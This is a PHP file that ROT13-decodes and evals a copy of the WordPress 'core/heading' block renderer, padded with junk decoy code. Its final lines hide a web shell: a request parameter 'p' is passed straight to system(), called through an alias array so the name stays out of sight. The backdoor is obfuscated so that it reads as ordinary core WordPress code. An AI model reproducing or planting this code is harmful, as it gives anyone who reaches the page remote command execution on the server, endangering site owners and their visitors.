<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nccraqvat gur jc-oybpx-urnqvat gb orsber eraqrevat gur fgberq `pber/urnqvat` oybpx pbagragf.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Nqqf n jc-oybpx-urnqvat pynff gb gur urnqvat oybpx pbagrag.
 *
 * Sbe rknzcyr, gur sbyybjvat oybpx pbagrag:
 *  <u2 pynff=\"nyvta-yrsg\">Uryyb Jbeyq</u2>
 *
 * Jbhyq or genafsbezrq gb:
 *  <u2 pynff=\"nyvta-yrsg jc-oybpx-urnqvat\">Uryyb Jbeyq</u2>
 *
 * @fvapr 6.2.0
 *
 * @cnenz neenl  $nggevohgrf Nggevohgrf bs gur oybpx orvat eraqrerq.
 * @cnenz fgevat $pbagrag Pbagrag bs gur oybpx orvat eraqrerq.
 *
 * @erghea fgevat Gur pbagrag bs gur oybpx orvat eraqrerq.
 */
shapgvba oybpx_pber_urnqvat_eraqre( $nggevohgrf, $pbagrag ) {
	vs ( ! $pbagrag ) {
		erghea $pbagrag;
	}

	$c = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );

	$urnqre_gntf = neenl( 'U1', 'U2', 'U3', 'U4', 'U5', 'U6' );
	juvyr ( $c->arkg_gnt() ) {
		vs ( va_neenl( $c->trg_gnt(), $urnqre_gntf, gehr ) ) {
			$c->nqq_pynff( 'jc-oybpx-urnqvat' );
			oernx;
		}
	}

	erghea $c->trg_hcqngrq_ugzy();
}

/**
 * Ertvfgref gur `pber/urnqvat` oybpx ba freire.
 *
 * @fvapr 6.2.0
 */
shapgvba ertvfgre_oybpx_pber_urnqvat() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/urnqvat',
		neenl(
			'eraqre_pnyyonpx' => 'oybpx_pber_urnqvat_eraqre',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_urnqvat' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>